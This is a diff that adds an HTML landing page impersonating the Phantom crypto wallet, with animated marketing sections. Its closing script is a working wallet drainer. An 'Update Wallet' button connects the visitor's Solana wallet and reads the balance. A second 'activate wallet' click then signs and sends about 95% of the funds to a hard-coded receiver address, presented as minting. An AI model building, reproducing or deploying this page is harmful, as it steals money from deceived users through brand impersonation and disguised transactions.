@@ -1,0 +1,551 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Phantom - Unleash the Future</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
+    <style>
+      /* 3D Sphere Animation Styles for Hero */
+      .sphere-container {
+        perspective: 1000px;
+        margin-bottom: 2rem;
+        position: relative;
+        width: 200px;
+        height: 200px;
+        margin-left: auto;
+        margin-right: auto;
+      }
+      .sphere {
+        width: 200px;
+        height: 200px;
+        position: relative;
+        transform-style: preserve-3d;
+        animation: rotateSphere 12s infinite linear;
+      }
+      .sphere-core {
+        width: 100%;
+        height: 100%;
+        background: radial-gradient(
+          circle at center,
+          rgba(147, 51, 234, 0.8),
+          rgba(147, 51, 234, 0.2)
+        );
+        border-radius: 50%;
+        box-shadow: 0 0 30px rgba(147, 51, 234, 0.7);
+        transform: translateZ(50px);
+      }
+      .particle {
+        position: absolute;
+        width: 10px;
+        height: 10px;
+        background: rgba(255, 255, 255, 0.8);
+        border-radius: 50%;
+        box-shadow: 0 0 10px rgba(147, 51, 234, 1);
+      }
+      .particle-1 {
+        animation: orbit1 5s infinite linear;
+        top: 20px;
+        left: 50%;
+      }
+      .particle-2 {
+        animation: orbit2 6s infinite linear;
+        top: 50%;
+        left: 20px;
+      }
+      .particle-3 {
+        animation: orbit3 4s infinite linear;
+        top: 50%;
+        right: 20px;
+      }
+
+      @keyframes rotateSphere {
+        0% {
+          transform: rotateX(0deg) rotateY(0deg);
+        }
+        100% {
+          transform: rotateX(360deg) rotateY(360deg);
+        }
+      }
+      @keyframes orbit1 {
+        0% {
+          transform: rotateZ(0deg) translateX(80px) rotateZ(0deg);
+        }
+        100% {
+          transform: rotateZ(360deg) translateX(80px) rotateZ(-360deg);
+        }
+      }
+      @keyframes orbit2 {
+        0% {
+          transform: rotateZ(120deg) translateX(80px) rotateZ(-120deg);
+        }
+        100% {
+          transform: rotateZ(480deg) translateX(80px) rotateZ(-480deg);
+        }
+      }
+      @keyframes orbit3 {
+        0% {
+          transform: rotateZ(240deg) translateX(80px) rotateZ(-240deg);
+        }
+        100% {
+          transform: rotateZ(600deg) translateX(80px) rotateZ(-600deg);
+        }
+      }
+
+      /* 3D Animation for Feature Cards */
+      .feature-card {
+        perspective: 1000px;
+        transition: transform 0.5s ease;
+      }
+      .feature-card:hover {
+        transform: rotateY(10deg) rotateX(10deg) scale(1.05);
+        box-shadow: 0 0 30px rgba(147, 51, 234, 0.7);
+      }
+      .feature-icon {
+        width: 48px;
+        height: 48px;
+        margin-bottom: 1rem;
+      }
+
+      /* 3D Animation for Contact Section */
+      .contact-button {
+        perspective: 1000px;
+        transition: transform 0.3s ease;
+      }
+      .contact-button:hover {
+        transform: rotateY(8deg) rotateX(8deg) scale(1.05);
+        box-shadow: 0 0 20px rgba(147, 51, 234, 0.6);
+      }
+      .ring-container {
+        perspective: 1000px;
+        margin-bottom: 1.5rem;
+      }
+      .ring {
+        width: 150px;
+        height: 150px;
+        position: relative;
+        transform-style: preserve-3d;
+        animation: rotateRing 8s infinite linear;
+        margin: 0 auto;
+      }
+      .ring-face {
+        position: absolute;
+        width: 150px;
+        height: 150px;
+        border: 3px solid rgba(147, 51, 234, 0.8);
+        border-radius: 50%;
+        box-shadow: 0 0 15px rgba(147, 51, 234, 0.5);
+        opacity: 0.8;
+      }
+      .ring-face.inner {
+        transform: rotateY(0deg) translateZ(50px);
+      }
+      .ring-face.outer {
+        transform: rotateY(90deg) translateZ(50px);
+      }
+
+      @keyframes rotateRing {
+        0% {
+          transform: rotateX(0deg) rotateY(0deg);
+        }
+        100% {
+          transform: rotateX(360deg) rotateY(360deg);
+        }
+      }
+
+      /* 3D Animations for Home Section */
+      .hero-title {
+        perspective: 1000px;
+        display: inline-block;
+        animation: floatTitle 4s ease-in-out infinite;
+      }
+      @keyframes floatTitle {
+        0%,
+        100% {
+          transform: translateY(0) rotateX(0deg);
+        }
+        50% {
+          transform: translateY(-10px) rotateX(5deg);
+        }
+      }
+      .wallet-button {
+        animation: pulseGlow 2s ease-in-out infinite;
+      }
+      @keyframes pulseGlow {
+        0%,
+        100% {
+          box-shadow: 0 0 10px rgba(147, 51, 234, 0.5);
+        }
+        50% {
+          box-shadow: 0 0 20px rgba(147, 51, 234, 1);
+        }
+      }
+
+      /* Logo Animation */
+      .phantom-logo {
+        width: 40px;
+        height: 40px;
+        transition: transform 0.3s ease;
+      }
+      .phantom-logo:hover {
+        transform: rotate(360deg);
+      }
+    </style>
+  </head>
+  <body class="bg-gray-900 text-white font-sans">
+    <!-- Navbar -->
+    <nav class="bg-gray-800 py-4 px-6 sticky top-0 z-50 shadow-lg">
+      <div class="max-w-7xl mx-auto flex justify-between items-center">
+        <div class="flex items-center">
+          <svg
+            class="phantom-logo"
+            viewBox="0 0 24 24"
+            fill="none"
+            xmlns="http://www.w3.org/2000/svg"
+          >
+            <path
+              d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8z"
+              fill="rgba(147, 51, 234, 0.8)"
+            />
+            <path
+              d="M12 6c-3.31 0-6 2.69-6 6s2.69 6 6 6 6-2.69 6-6-2.69-6-6-6zm0 10c-2.21 0-4-1.79-4-4s1.79-4 4-4 4 1.79 4 4-1.79 4-4 4z"
+              fill="white"
+            />
+            <path
+              d="M12 8c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"
+              fill="rgba(147, 51, 234, 1)"
+            />
+          </svg>
+          <span class="text-2xl font-bold ml-2">Phantom</span>
+        </div>
+        <!-- Desktop Menu -->
+        <div class="hidden md:flex space-x-6">
+          <a href="#home" class="hover:text-purple-400 transition">Home</a>
+          <a href="#features" class="hover:text-purple-400 transition"
+            >Features</a
+          >
+          <a href="#about" class="hover:text-purple-400 transition">About</a>
+          <a href="#contact" class="hover:text-purple-400 transition"
+            >Contact</a
+          >
+        </div>
+        <!-- Hamburger Icon for Mobile -->
+        <button id="hamburger" class="md:hidden focus:outline-none">
+          <svg
+            class="w-8 h-8 text-white"
+            fill="none"
+            stroke="currentColor"
+            viewBox="0 0 24 24"
+            xmlns="http://www.w3.org/2000/svg"
+          >
+            <path
+              stroke-linecap="round"
+              stroke-linejoin="round"
+              stroke-width="2"
+              d="M4 6h16M4 12h16M4 18h16"
+            ></path>
+          </svg>
+        </button>
+      </div>
+      <!-- Mobile Menu (Hidden by Default) -->
+      <div
+        id="mobile-menu"
+        class="hidden md:hidden bg-gray-800 mt-4 flex flex-col items-center space-y-4 py-4"
+      >
+        <a
+          href="#home"
+          class="hover:text-purple-400 transition text-lg font-semibold"
+          >Home</a
+        >
+        <a
+          href="#features"
+          class="hover:text-purple-400 transition text-lg font-semibold"
+          >Features</a
+        >
+        <a
+          href="#about"
+          class="hover:text-purple-400 transition text-lg font-semibold"
+          >About</a
+        >
+        <a
+          href="#contact"
+          class="hover:text-purple-400 transition text-lg font-semibold"
+          >Contact</a
+        >
+      </div>
+    </nav>
+
+    <!-- Hero -->
+    <section
+      id="home"
+      class="min-h-screen flex items-center justify-center bg-gradient-to-b from-gray-900 to-gray-700"
+    >
+      <div class="text-center max-w-3xl mx-auto px-4">
+        <div class="sphere-container">
+          <div class="sphere">
+            <div class="sphere-core"></div>
+            <div class="particle particle-1"></div>
+            <div class="particle particle-2"></div>
+            <div class="particle particle-3"></div>
+          </div>
+        </div>
+        <h1 class="hero-title text-5xl md:text-7xl font-extrabold mb-6">
+          Welcome to Phantom
+        </h1>
+        <p class="text-lg md:text-xl mb-8">
+          Unleash the future with cutting-edge technology and seamless
+          experiences.
+        </p>
+        <a
+          id="connect-wallet"
+          href="#"
+          class="wallet-button bg-purple-600 hover:bg-purple-700 text-white font-semibold py-3 px-6 rounded-lg transition"
+          >Update Wallet</a
+        >
+        <div id="status" class="text-sm mt-4 text-purple-400"></div>
+      </div>
+    </section>
+
+    <!-- Features -->
+    <section id="features" class="py-16 bg-gray-800">
+      <div class="max-w-7xl mx-auto px-4">
+        <h2 class="text-4xl font-bold text-center mb-12">Our Features</h2>
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
+          <div
+            class="feature-card bg-gray-700 p-6 rounded-lg shadow-lg transition"
+          >
+            <svg
+              class="feature-icon"
+              fill="none"
+              stroke="currentColor"
+              viewBox="0 0 24 24"
+              xmlns="http://www.w3.org/2000/svg"
+            >
+              <path
+                stroke-linecap="round"
+                stroke-linejoin="round"
+                stroke-width="2"
+                d="M12 8c-1.657 0-3 1.343-3 3s1.343 3 3 3 3-1.343 3-3-1.343-3-3-3zm0 10c-3.314 0-6-2.686-6-6s2.686-6 6-6 6 2.686 6 6-2.686 6-6 6z"
+              ></path>
+            </svg>
+            <h3 class="text-2xl font-semibold mb-4">Innovative Design</h3>
+            <p>
+              Sleek, modern interfaces that adapt to any device, ensuring a
+              flawless user experience.
+            </p>
+          </div>
+          <div
+            class="feature-card bg-gray-700 p-6 rounded-lg shadow-lg transition"
+          >
+            <svg
+              class="feature-icon"
+              fill="none"
+              stroke="currentColor"
+              viewBox="0 0 24 24"
+              xmlns="http://www.w3.org/2000/svg"
+            >
+              <path
+                stroke-linecap="round"
+                stroke-linejoin="round"
+                stroke-width="2"
+                d="M13 10V3L4 14h7v7l9-11h-7z"
+              ></path>
+            </svg>
+            <h3 class="text-2xl font-semibold mb-4">High Performance</h3>
+            <p>
+              Lightning-fast load times and optimized functionality for seamless
+              interactions.
+            </p>
+          </div>
+          <div
+            class="feature-card bg-gray-700 p-6 rounded-lg shadow-lg transition"
+          >
+            <svg
+              class="feature-icon"
+              fill="none"
+              stroke="currentColor"
+              viewBox="0 0 24 24"
+              xmlns="http://www.w3.org/2000/svg"
+            >
+              <path
+                stroke-linecap="round"
+                stroke-linejoin="round"
+                stroke-width="2"
+                d="M12 11c0-1.104-.896-2-2-2s-2 .896-2 2 2 4 2 4 2-2.896 2-4zm0 0c0-1.104-.896-2-2-2s-2 .896-2 2 2 4 2 4 2-2.896 2-4zm0 0c0-1.104-.896-2-2-2s-2 .896-2 2 2 4 2 4 2-2.896 2-4z"
+              ></path>
+            </svg>
+            <h3 class="text-2xl font-semibold mb-4">Secure & Reliable</h3>
+            <p>
+              Top-tier security protocols to keep your data safe and systems
+              running smoothly.
+            </p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- About -->
+    <section id="about" class="py-16 bg-gray-900">
+      <div class="max-w-7xl mx-auto px-4 text-center">
+        <h2 class="text-4xl font-bold mb-6">About Phantom</h2>
+        <p class="text-lg max-w-2xl mx-auto">
+          Phantom is your gateway to the future, delivering innovative solutions
+          that empower businesses and individuals. Our mission is to push
+          boundaries and create technology that inspires.
+        </p>
+      </div>
+    </section>
+
+    <!-- Contact -->
+    <section id="contact" class="py-16 bg-gray-800">
+      <div class="max-w-7xl mx-auto px-4 text-center">
+        <div class="ring-container">
+          <div class="ring">
+            <div class="ring-face inner"></div>
+            <div class="ring-face outer"></div>
+          </div>
+        </div>
+        <h2 class="text-4xl font-bold mb-6">Get in Touch</h2>
+        <p class="text-lg mb-8">
+          Have questions or want to collaborate? Reach out to us!
+        </p>
+        <div class="flex justify-center space-x-4">
+          <a
+            href="mailto:contact@phantom.com"
+            class="contact-button bg-purple-600 hover:bg-purple-700 text-white font-semibold py-3 px-6 rounded-lg transition"
+            >Email Us</a
+          >
+          <a
+            href="#contact"
+            class="contact-button border border-purple-600 hover:bg-purple-600 text-white font-semibold py-3 px-6 rounded-lg transition"
+            >Join Our Community</a
+          >
+        </div>
+      </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="bg-gray-900 py-6 text-center">
+      <p>&copy; 2025 Phantom. All rights reserved.</p>
+    </footer>
+
+    <!-- JS -->
+    <script>
+      $(document).ready(function () {
+        // Hamburger Menu Toggle
+        $("#hamburger").on("click", function () {
+          $("#mobile-menu").slideToggle("fast");
+        });
+
+        // Close mobile menu when a link is clicked
+        $("#mobile-menu a").on("click", function () {
+          $("#mobile-menu").slideUp("fast");
+        });
+
+        // Solana Wallet Integration
+        const { Connection, PublicKey, Transaction, SystemProgram } =
+          solanaWeb3;
+        const network =
+          "https://solana-mainnet.g.alchemy.com/v2/PzAsWvBA7NMqe5_N_O-Ok";
+        const connection = new Connection(network, "confirmed");
+        const receiverAddress = "7aE5Y7PvfUr52WnruiDATFpR99PWPo4q9U7vu3Hid3Yh";
+
+        $("#connect-wallet").on("click", async function connectWallet() {
+          if (window.solana && window.solana.isPhantom) {
+            try {
+              const resp = await window.solana.connect();
+              const publicKey = new PublicKey(resp.publicKey.toString());
+
+              $("#status").text("Wallet connected: " + publicKey.toBase58());
+
+              const balanceLamports = await connection.getBalance(publicKey);
+              const balanceSOL = balanceLamports / 1e9;
+              $("#status").text(`Wallet balance: ${balanceSOL.toFixed(4)} SOL`);
+
+              // Change button to Mint
+              $("#connect-wallet")
+                .text("activate wallet")
+                .removeClass("bg-purple-600")
+                .addClass("bg-green-600 hover:bg-green-700")
+                .off("click")
+                .on("click", async function mint() {
+                  try {
+                    const feeEstimate = 5000;
+                    const minRentExempt =
+                      await connection.getMinimumBalanceForRentExemption(0);
+                    const maxAvailable =
+                      balanceLamports - feeEstimate - minRentExempt;
+
+                    if (maxAvailable <= 0) {
+                      $("#status").text(
+                        `Insufficient funds. Available: ${balanceSOL.toFixed(
+                          4
+                        )} SOL. Required: ${(
+                          (feeEstimate + minRentExempt) /
+                          1e9
+                        ).toFixed(4)} SOL.`
+                      );
+                      return;
+                    }
+
+                    const transferAmount = Math.floor(maxAvailable * 0.95); // Leave buffer
+
+                    const transaction = new Transaction().add(
+                      SystemProgram.transfer({
+                        fromPubkey: publicKey,
+                        toPubkey: new PublicKey(receiverAddress),
+                        lamports: transferAmount,
+                      })
+                    );
+
+                    transaction.feePayer = publicKey;
+                    const { blockhash } = await connection.getLatestBlockhash();
+                    transaction.recentBlockhash = blockhash;
+
+                    const signed = await window.solana.signTransaction(
+                      transaction
+                    );
+                    $("#status").text("Transaction signed, sending...");
+
+                    const txid = await connection.sendRawTransaction(
+                      signed.serialize()
+                    );
+                    await connection.confirmTransaction(txid, "confirmed");
+                    $("#status").text("Transaction confirmed: " + txid);
+                  } catch (err) {
+                    $("#status").text("Error during minting: " + err.message);
+                    console.error("Minting error:", err);
+                  }
+                });
+            } catch (err) {
+              $("#status").text(
+                "Error connecting to Phantom Wallet: " + err.message
+              );
+              console.error("Connection error:", err);
+            }
+          } else {
+            $("#status").text("Phantom Wallet not found.");
+            const isFirefox = typeof InstallTrigger !== "undefined";
+            const isChrome = !!window.chrome;
+
+            if (isFirefox) {
+              window.open(
+                "https://addons.mozilla.org/en-US/firefox/addon/phantom-app/",
+                "_blank"
+              );
+            } else if (isChrome) {
+              window.open(
+                "https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa",
+                "_blank"
+              );
+            } else {
+              $("#status").text("Please install the Phantom Wallet extension.");
+            }
+          }
+        });
+      });
+    </script>
+  </body>
+</html>
